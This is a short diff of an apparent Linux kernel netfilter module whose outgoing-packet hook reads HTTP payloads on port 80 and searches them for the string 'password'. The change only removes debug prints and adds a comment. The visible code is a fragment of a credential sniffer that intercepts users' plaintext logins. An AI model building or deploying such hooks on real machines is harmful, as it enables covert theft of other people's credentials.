@@ -29,7 +29,6 @@ unsigned int hook_func_outgoing(void *priv,
   char            * data;	   
 
   iph = ip_hdr(skb);
-  printk(KERN_DEBUG "packet out");
 
   //is it ip/tcp
   if(iph && iph->protocol && (iph->protocol == IPPROTO_TCP)) {
@@ -37,8 +36,8 @@ unsigned int hook_func_outgoing(void *priv,
 
 	//is it port 80
 	if (tcph && (tcph->dest) == *(unsigned short *)http_port) {
-  	printk(KERN_DEBUG "%d\n", ntohs(tcph->dest));
 		if(tcph->doff) {
+			//get the http data and header by looking at the tcp data offset
 			data = (char *)((unsigned char *)tcph + (tcph->doff * 4));
 			if(strstr(data, "password")) {
 				printk(KERN_DEBUG "found a password\n");
